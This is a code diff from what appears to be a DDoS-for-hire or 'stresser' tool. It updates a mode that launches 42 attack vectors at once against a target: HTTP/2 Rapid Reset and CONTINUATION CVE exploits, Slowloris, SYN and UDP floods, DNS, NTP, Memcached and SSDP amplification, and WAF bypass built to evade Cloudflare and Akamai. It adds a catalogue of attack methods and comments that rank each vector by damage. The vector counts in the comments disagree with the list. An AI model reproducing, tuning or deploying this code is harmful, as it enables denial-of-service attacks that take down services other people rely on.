@@ -143,10 +143,11 @@ const MAX_WORKERS_PER_POOL = IS_DEPLOYED ? 999 : 1;
 const DEV_MAX_THREADS = 64;
 
 // Dev: limit total concurrent worker_threads across ALL attack pools.
-// 14 workers × 48MB heap = ~672MB peak — safe for 2GB containers.
+// 22 workers × 128MB heap = ~2.8GB peak — safe on Replit's 4GB containers.
+// Previously 14 × 48MB but heap was OOM-killing workers (h3-rapid-reset needs ~128MB).
 // Deployed: no limit.
 let _activeWorkers = 0;
-const MAX_TOTAL_WORKERS_DEV = IS_DEPLOYED ? Infinity : 14;
+const MAX_TOTAL_WORKERS_DEV = IS_DEPLOYED ? Infinity : 22;
 
 // ── Webhook ────────────────────────────────────────────────────────────────
 async function fireWebhook(url: string, attack: typeof attacksTable.$inferSelect, event = "attack_finished") {
@@ -616,58 +617,58 @@ async function runAttackWorkers(
       }
     };
 
-    // ── Launch all 35 vectors simultaneously (ARES OMNIVECT ∞ v2) ────────────────
+    // ── Launch all 43 vectors simultaneously (ARES OMNIVECT ∞ v3) ────────────────
+    // ORDERING: highest-impact vectors FIRST — dev worker cap (22) hits best vectors.
+    // In deployed (uncapped): all 43 run at full power simultaneously.
     const geassPromise = Promise.all([
-      // L7 Application (12 vectors)
-      spawnPool("conn-flood",          target, port, connT,   connW,   signal, makeGeassOnStats("conn")),
-      spawnPool("slowloris",           target, port, slowT,   slowW,   signal, makeGeassOnStats("slow")),
-      spawnPool("http2-flood",         target, port, h2T,     h2W,     signal, onStats),
-      spawnPool("http2-continuation",  target, port, contT,   contW,   signal, onStats),
-      spawnPool("hpack-bomb",          target, port, hpackT,  hpackW,  signal, onStats),
-      spawnPool("waf-bypass",          target, port, wafT,    wafW,    signal, onStats),
-      spawnPool("ws-flood",            target, port, wsT,     wsW,     signal, makeGeassOnStats("ws")),
-      spawnPool("graphql-dos",         target, port, gqlT,    gqlW,    signal, onStats),
-      spawnPool("rudy-v2",             target, port, rudyT,   rudyW,   signal, makeGeassOnStats("rudy")),
-      spawnPool("cache-poison",        target, port, cacheT,  cacheW,  signal, onStats),
-      spawnPool("http-bypass",         target, port, bypassT, bypassW, signal, onStats),
-      spawnPool("keepalive-exhaust",   target, port, kaT,     kaW,     signal, makeGeassOnStats("ka")),
-      // L7 Advanced H2 (6 vectors — +h2-rst-burst, +grpc-flood)
-      spawnPool("h2-settings-storm",   target, port, stormT,  stormW,  signal, onStats),
-      spawnPool("http-pipeline",       target, port, pipeT,   pipeW,   signal, onStats),
-      spawnPool("h2-ping-storm",       target, port, pingT,   pingW,   signal, onStats),
-      spawnPool("http-smuggling",      target, port, smugT,   smugW,   signal, onStats),
-      spawnPool("h2-rst-burst",        target, port, rstT,    rstW,    signal, onStats),               // [NEW 35] CVE-2023-44487 pure RST engine
-      spawnPool("grpc-flood",          target, port, grpcT,   grpcW,   signal, onStats),               // [NEW 36] gRPC handler pool exhaustion
-      // TLS / Crypto (3 vectors)
-      spawnPool("tls-renego",          target, port, tlsT,    tlsW,    signal, makeGeassOnStats("tls")),
-      spawnPool("ssl-death",           target, port, sslT,    sslW,    signal, makeGeassOnStats("ssl")),
-      spawnPool("quic-flood",          target, port, quicT,   quicW,   signal, onStats),
-      // Extended App — Tier 2 (5 vectors)
-      spawnPool("xml-bomb",            target, port, xmlT,    xmlW,    signal, onStats),
-      spawnPool("slow-read",           target, port, slowRT,  slowRW,  signal, makeGeassOnStats("sr")),
-      spawnPool("range-flood",         target, port, rangeT,  rangeW,  signal, onStats),
-      spawnPool("app-smart-flood",     target, port, appT,    appW,    signal, onStats),
-      spawnPool("large-header-bomb",   target, port, lhbT,    lhbW,    signal, onStats),
-      // L7 H2 Priority (1 vector)
-      spawnPool("http2-priority-storm",target, port, prioT,   prioW,   signal, onStats),
-      // L4 Transport (1 vector)
-      spawnPool("syn-flood",           target, port, synT,    synW,    signal, onStats),
-      // L3 Network (5 vectors)
-      spawnPool("icmp-flood",          target, port, icmpT,   icmpW,   signal, onStats),
-      spawnPool("dns-amp",             target, port, dnsT,    dnsW,    signal, onStats),
-      spawnPool("ntp-amp",             target, port, ntpT,    ntpW,    signal, onStats),
-      spawnPool("mem-amp",             target, port, memT,    memW,    signal, onStats),
-      spawnPool("ssdp-amp",            target, port, ssdpT,   ssdpW,   signal, onStats),
-      // UDP / Volumetric (2 vectors)
-      spawnPool("udp-flood",           target, port, udpT,    udpW,    signal, onStats),
-      spawnPool("doh-flood",           target, port, dohT,    dohW,    signal, onStats),
-      // 2026 New Vectors (4 vectors — total 39)
-      spawnPool("rapid-reset",         target, port, rrT,     rrW,     signal, onStats),          // [v39] CVE-2023-44487 Ultra: 2000 streams/burst, single write(), Chrome 136 AKAMAI
-      spawnPool("ws-compression-bomb", target, port, wcbT,    wcbW,    signal, onStats),          // [v40] permessage-deflate 1820× amplification
-      spawnPool("h2-goaway-loop",      target, port, goawayT, goawayW, signal, onStats),          // [v41] H2 GOAWAY Loop: 5000 TLS teardown/setup cycles/s
-      spawnPool("sse-exhaust",         target, port, sseT,    sseW,    signal, makeGeassOnStats("sse")), // [v42] SSE Exhaust: 18K goroutine hold
-      spawnPool("h3-rapid-reset",      target, 443,  h3rrT,   h3rrW,   signal, onStats),                 // [v43] H3 Rapid Reset: CVE-2023-44487 via QUIC/UDP (3-packet DCID burst)
-    ]); // Total: 40 ARES OMNIVECT ∞ v3 vectors
+      // ★★★★★ TIER 1 — Max bandwidth UDP (bypasses all L7 rate limiting)
+      spawnPool("h3-rapid-reset",      target, 443,  h3rrT,   h3rrW,   signal, onStats),          // [1] CVE-2023-44487 via QUIC/UDP — 2GB/min, unrate-limitable
+      spawnPool("quic-flood",          target, 443,  quicT,   quicW,   signal, onStats),           // [2] QUIC Initial flood UDP — 1.5GB/min
+      // ★★★★★ TIER 1 — True CVE exploits (highest server CPU burn)
+      spawnPool("rapid-reset",         target, port, rrT,     rrW,     signal, onStats),           // [3] CVE-2023-44487 Ultra H2: 2000 streams/burst, Chrome AKAMAI fp
+      spawnPool("h2-rst-burst",        target, port, rstT,    rstW,    signal, onStats),           // [4] CVE-2023-44487 pure RST — true H2 stream open→RST cycle
+      spawnPool("http2-continuation",  target, port, contT,   contW,   signal, onStats),           // [5] CVE-2024-27316 CONTINUATION OOM — server buffers headers forever
+      // ★★★★ TIER 2 — High-throughput L7 (saturates server thread pools)
+      spawnPool("h2-settings-storm",   target, port, stormT,  stormW,  signal, onStats),           // [6] H2 Settings Storm — nginx/Apache SETTINGS frame saturation
+      spawnPool("http-pipeline",       target, port, pipeT,   pipeW,   signal, onStats),           // [7] HTTP/1.1 Pipeline — saturates keep-alive connection pool
+      spawnPool("conn-flood",          target, port, connT,   connW,   signal, makeGeassOnStats("conn")),  // [8] TLS conn exhaust — 12K persistent TLS sockets
+      spawnPool("slowloris",           target, port, slowT,   slowW,   signal, makeGeassOnStats("slow")),  // [9] Slowloris — 15K half-open connections
+      spawnPool("hpack-bomb",          target, port, hpackT,  hpackW,  signal, onStats),           // [10] HPACK bomb — header table eviction CPU storm
+      spawnPool("waf-bypass",          target, port, wafT,    wafW,    signal, onStats),           // [11] WAF Bypass — Chrome JA4 fingerprint + TLS bypass
+      spawnPool("tls-renego",          target, port, tlsT,    tlsW,    signal, makeGeassOnStats("tls")),  // [12] TLS renegotiation — RSA CPU exhaustion
+      spawnPool("ws-compression-bomb", target, port, wcbT,    wcbW,    signal, onStats),           // [13] WS Compression Bomb — 1820× permessage-deflate amplification
+      spawnPool("h2-ping-storm",       target, port, pingT,   pingW,   signal, onStats),           // [14] H2 PING storm — WINDOW_UPDATE flood
+      spawnPool("http2-flood",         target, port, h2T,     h2W,     signal, onStats),           // [15] H2 stream flood — multiplexed request burst
+      spawnPool("ssl-death",           target, port, sslT,    sslW,    signal, makeGeassOnStats("ssl")),  // [16] SSL Death Record — 1-byte TLS handshake
+      spawnPool("h2-goaway-loop",      target, port, goawayT, goawayW, signal, onStats),           // [17] H2 GOAWAY Loop — 5000 TLS teardown/setup/s
+      spawnPool("app-smart-flood",     target, port, appT,    appW,    signal, onStats),           // [18] App Smart Flood — session-aware CF bypass
+      spawnPool("large-header-bomb",   target, port, lhbT,    lhbW,    signal, onStats),           // [19] Large Header Bomb — header table OOM
+      spawnPool("dns-amp",             target, port, dnsT,    dnsW,    signal, onStats),           // [20] DNS amplification — NS server flood
+      spawnPool("grpc-flood",          target, port, grpcT,   grpcW,   signal, onStats),           // [21] gRPC handler pool exhaustion
+      spawnPool("keepalive-exhaust",   target, port, kaT,     kaW,     signal, makeGeassOnStats("ka")),   // [22] Keepalive exhaust — hold connections
+      // ★★★ TIER 3 — Supplementary (all run in deployed, skipped in dev if cap reached)
+      spawnPool("http2-priority-storm",target, port, prioT,   prioW,   signal, onStats),           // [23] H2 PRIORITY dep-tree CPU
+      spawnPool("ws-flood",            target, port, wsT,     wsW,     signal, makeGeassOnStats("ws")),   // [24] WS goroutine exhaust
+      spawnPool("graphql-dos",         target, port, gqlT,    gqlW,    signal, onStats),           // [25] GraphQL resolver explosion
+      spawnPool("rudy-v2",             target, port, rudyT,   rudyW,   signal, makeGeassOnStats("rudy")), // [26] RUDY slow POST — multipart trickle
+      spawnPool("cache-poison",        target, port, cacheT,  cacheW,  signal, onStats),           // [27] CDN cache eviction
+      spawnPool("http-bypass",         target, port, bypassT, bypassW, signal, onStats),           // [28] Chrome 3-layer bypass
+      spawnPool("http-smuggling",      target, port, smugT,   smugW,   signal, onStats),           // [29] HTTP request smuggling
+      spawnPool("xml-bomb",            target, port, xmlT,    xmlW,    signal, onStats),           // [30] XML billion-laughs
+      spawnPool("slow-read",           target, port, slowRT,  slowRW,  signal, makeGeassOnStats("sr")),   // [31] Slow Read TCP window
+      spawnPool("range-flood",         target, port, rangeT,  rangeW,  signal, onStats),           // [32] HTTP Range I/O amplification
+      spawnPool("sse-exhaust",         target, port, sseT,    sseW,    signal, makeGeassOnStats("sse")),   // [33] SSE Exhaust — goroutine hold
+      // ★★ TIER 4 — L4/L3 Volumetric (very effective in deployed)
+      spawnPool("syn-flood",           target, port, synT,    synW,    signal, onStats),           // [34] SYN flood
+      spawnPool("icmp-flood",          target, port, icmpT,   icmpW,   signal, onStats),           // [35] ICMP echo flood
+      spawnPool("ntp-amp",             target, port, ntpT,    ntpW,    signal, onStats),           // [36] NTP mode 7 monlist amplification
+      spawnPool("mem-amp",             target, port, memT,    memW,    signal, onStats),           // [37] Memcached binary UDP amplification
+      spawnPool("ssdp-amp",            target, port, ssdpT,   ssdpW,   signal, onStats),           // [38] SSDP M-SEARCH UPnP amplification
+      spawnPool("udp-flood",           target, port, udpT,    udpW,    signal, onStats),           // [39] UDP bandwidth saturation
+      spawnPool("doh-flood",           target, port, dohT,    dohW,    signal, onStats),           // [40] DoH recursive flood
+      spawnPool("tls-session-exhaust", target, port, tlsT,    tlsW,    signal, onStats),           // [41] TLS session cache exhaust
+      spawnPool("cache-buster",        target, port, cacheT,  cacheW,  signal, onStats),           // [42] Cache buster
+    ]); // Total: 42 vectors — ARES OMNIVECT ∞ v3
 
     // ── ADAPTIVE BURST MODE v2 — T003 RESPONSE CODE INTELLIGENCE ────────────
     // After 30s: fires BURST WAVES with randomized duration (8-22s ON, 3-10s REST).
@@ -806,7 +807,7 @@ async function runAttackWorkers(
 // ── Static method catalogue ───────────────────────────────────────────────
 const METHODS_CATALOGUE = [
   // Geass / Special
-  { id: "geass-override",       name: "Geass Override ∞ [ARES 35v]",          layer: "ALL",  protocol: "TCP/UDP/H2/TLS",       tier: "ARES",   description: "MAX POWER — 35 simultaneous attack vectors: H2+TCP+UDP+TLS+Slowloris+WAF+WebSocket+GraphQL+RUDY+Cache+Pipeline+Smuggling+QUIC+ICMP+DNS+NTP+Memcached+SSDP+DoH+gRPC" },
+  { id: "geass-override",       name: "Geass Override ∞ [ARES 42v]",          layer: "ALL",  protocol: "TCP/UDP/H2/H3/TLS",    tier: "ARES",   description: "MAX POWER — 42 simultaneous attack vectors: H3-RapidReset(CVE-44487)+QUIC+H2-RST+H2-CONTINUATION(CVE-27316)+H2-Settings+Pipeline+Slowloris+HPACK+WAF+TLS+WS-Deflate+DNS+gRPC+..." },
   { id: "bypass-storm",         name: "Bypass Storm ∞ (3-Phase Composite)",    layer: "L7",   protocol: "HTTP/2+TLS",           tier: "S",      description: "Phase 1: TLS Exhaust+ConnFlood → Phase 2: WAF Bypass+H2 RST → Phase 3: AppFlood+CacheBust. All 3 phases run concurrently with independent thread pools" },
   // L7 Application
   { id: "waf-bypass",           name: "Geass WAF Bypass",                     layer: "L7",   protocol: "HTTP/2",               tier: "S",      description: "JA3+AKAMAI Chrome fingerprint — evades Cloudflare/Akamai WAF with 7 concurrent vectors" },
